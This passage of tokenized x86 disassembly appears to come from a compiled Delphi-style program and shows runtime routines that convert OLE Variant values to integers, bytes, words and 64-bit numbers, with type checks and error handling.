pop ecx
mov [ fs : eax ] edx
push sub_40f319
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
sub_40f320
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f40c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ea74
jmp r-xdata
mov edx esi
call sub_40e5e0
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ea74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f3a0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_41432c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f184
jmp r-xdata
mov edx esp
mov eax esi
call sub_41432c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f320
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f40c
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f140
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f40c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f451 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f23c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40eb80
jmp r-xdata
mov eax ebx
call sub_40fd78
mov edx eax
mov eax esi
call sub_413084
jmp r-xdata
mov eax ebx
call sub_40f7d0
mov edx eax
mov eax esi
call sub_412fe4
jmp r-xdata
mov eax ebx
call sub_41113c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4130d0
jmp r-xdata
mov eax ebx
call sub_410da4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4130f4
jmp r-xdata
mov eax ebx
call sub_411a7c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413120
jmp r-xdata
mov eax ebx
call sub_411514
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_41314c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f1f0
jmp r-xdata
mov eax ebx
call sub_410890
mov edx eax
mov eax esi
call sub_413178
jmp r-xdata
mov eax ebx
call sub_40fc20
mov edx eax
mov eax esi
call sub_413064
jmp r-xdata
mov eax ebx
call sub_40fcd0
mov edx eax
mov eax esi
call sub_413004
jmp r-xdata
mov eax ebx
call sub_40fe70
mov edx eax
mov eax esi
call sub_413024
jmp r-xdata
mov eax ebx
call sub_40ff48
mov edx eax
mov eax esi
call sub_413044
jmp r-xdata
mov eax ebx
call sub_410294
push edx
push eax
mov eax esi
call sub_4130a4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f288
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f2d4
jmp r-xdata
mov dx 0x101
call sub_40e5e0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40ee18
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f3a0
xor edx edx
mov ax 0x1
call sub_40e5e0
jmp r-xdata
sub_40f638
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f6db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412858
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041d8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408210
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6e2
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_404630
retn
mov eax ebx
call sub_410890
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ea74
jmp r-xdata
sub_40f6ec
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ea74
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f728
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f140
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f7d0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f783
lea eax [ ebp - 0x14 ]
call sub_40ee18
retn
sub_40f78c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f7d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fbf1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f803 ]
mov eax [ ebp - 0x4 ]
call sub_40f638
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f638
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f7d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f6ec
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f728
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e5e0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f78c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f6ec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f6ec
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fa27 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f638
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f7d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403094
sub_40fc20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e5e0
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fcac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f7d0
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403094
sub_40fcd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e5e0
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fd53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f7d0
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403094
sub_40fd78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40fe4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f7d0
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fd9e ]
jmp [ eax * 4 + jump_table_40fdb0 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403094
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e5e0
sub_40fe70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40ff25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f7d0
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fe92 ]
jmp [ eax * 4 + jump_table_40fea5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403094
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e5e0
sub_40ff48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_41000d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410294
test edx edx
je r-xdata
mov al [ eax + lookup_table_40ff6e ]
jmp [ eax * 4 + jump_table_40ff82 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403094
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e5e0
sub_410030
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_40293c
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ea74
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410890
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4100dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4101ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412858
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408230
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4101d1
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_404630
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_40293c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ea74
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410890
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_4101dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410233
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f140
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410294
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41023a
lea eax [ ebp - 0x18 ]
call sub_40ee18
retn
sub_410248
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410294
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4106a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4102c7 ]
mov eax [ ebp - 0x4 ]
call sub_4100dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410294
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410030
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4101dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e5e0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410248
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410030
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410030
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4104eb ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
